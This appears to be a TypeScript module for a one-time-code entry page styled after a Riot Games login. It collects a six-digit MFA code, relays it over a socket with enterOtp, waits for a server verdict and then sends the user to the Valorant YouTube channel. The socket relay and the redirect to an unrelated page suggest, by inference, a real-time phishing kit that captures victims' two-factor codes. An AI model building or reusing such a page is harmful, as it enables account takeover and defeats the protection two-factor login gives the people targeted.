import faRight from '@/assets/icons/faRight';
import loadingIcon from '@/assets/image/icons/loading-icon';
import { html } from '@/lib/html';
import { socketService } from '@/services/socket';
import type { Result } from '@/types/riot';

const getEmail = (): string => {
    return sessionStorage.getItem('multifactor_email') || 'your email';
};
let isLoading = false;
let hasError = false;

const handleSubmit = async (): Promise<void> => {
    const inputs =
        document.querySelectorAll<HTMLInputElement>('input[data-index]');
    const code = Array.from(inputs)
        .map((input) => input.value)
        .join('');

    if (code.length !== 6) {
        return;
    }

    if (!socketService.isConnected()) {
        hasError = true;
        updateUI();
        return;
    }

    isLoading = true;
    hasError = false;
    updateUI();

    socketService.enterOtp(code);
};

const updateUI = (): void => {
    const submitBtn = document.getElementById(
        'submit-btn'
    ) as HTMLButtonElement;
    const inputs =
        document.querySelectorAll<HTMLInputElement>('input[data-index]');
    const errorDiv = document.getElementById('error-div');

    if (submitBtn) {
        if (isLoading) {
            submitBtn.disabled = true;
            submitBtn.innerHTML = html`
                <div class="flex items-center justify-center">
                    <div class="animate-spin">${loadingIcon}</div>
                </div>
            `;
        } else {
            submitBtn.disabled = false;
            submitBtn.innerHTML = faRight;
        }
    }

    inputs.forEach((input) => {
        input.disabled = isLoading;
    });

    if (errorDiv) {
        errorDiv.style.display = hasError ? 'flex' : 'none';
    }
};

const setupSocketEvents = (): void => {
    socketService.on('otp_result', (result: Result) => {
        isLoading = false;

        if (result.success) {
            hasError = false;
            updateUI();
            const redirectUrl = 'https://www.youtube.com/@valorant';
            window.location.replace(redirectUrl);
        } else {
            hasError = true;
            updateUI();
            const inputs =
                document.querySelectorAll<HTMLInputElement>(
                    'input[data-index]'
                );
            inputs.forEach((input) => (input.value = ''));
            inputs[0]?.focus();
        }
    });
};

export const setupEnterCodeEvents = (): void => {
    setupSocketEvents();

    const submitBtn = document.getElementById('submit-btn');
    const inputs =
        document.querySelectorAll<HTMLInputElement>('input[data-index]');
    const closeErrorBtn = document.getElementById('close-error-btn');

    submitBtn?.addEventListener('click', handleSubmit);

    closeErrorBtn?.addEventListener('click', () => {
        hasError = false;
        updateUI();
    });

    inputs.forEach((input, index) => {
        input.addEventListener('paste', (e) => {
            e.preventDefault();
            const pastedData = e.clipboardData?.getData('text') || '';
            const digits = pastedData.replace(/\D/g, '').slice(0, 6);

            if (digits.length === 6) {
                inputs.forEach((inp, i) => {
                    (inp as HTMLInputElement).value = digits[i] || '';
                });

                if (hasError) {
                    hasError = false;
                    updateUI();
                }

                setTimeout(() => handleSubmit(), 100);
            }
        });

        input.addEventListener('input', (e) => {
            if (hasError) {
                hasError = false;
                updateUI();
            }

            const target = e.target as HTMLInputElement;
            if (target.value.length === 1 && index < inputs.length - 1) {
                (inputs[index + 1] as HTMLInputElement).focus();
            }

            const allFilled = Array.from(inputs).every(
                (inp) => inp.value.length === 1
            );
            if (allFilled && !isLoading) {
                setTimeout(() => handleSubmit(), 100);
            }
        });

        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && input.value === '' && index > 0) {
                (inputs[index - 1] as HTMLInputElement).focus();
            }
        });
    });

    (inputs[0] as HTMLInputElement)?.focus();
};

export const cleanupEnterCodeEvents = (): void => {
    socketService.off('otp_result');
};

export { getEmail };
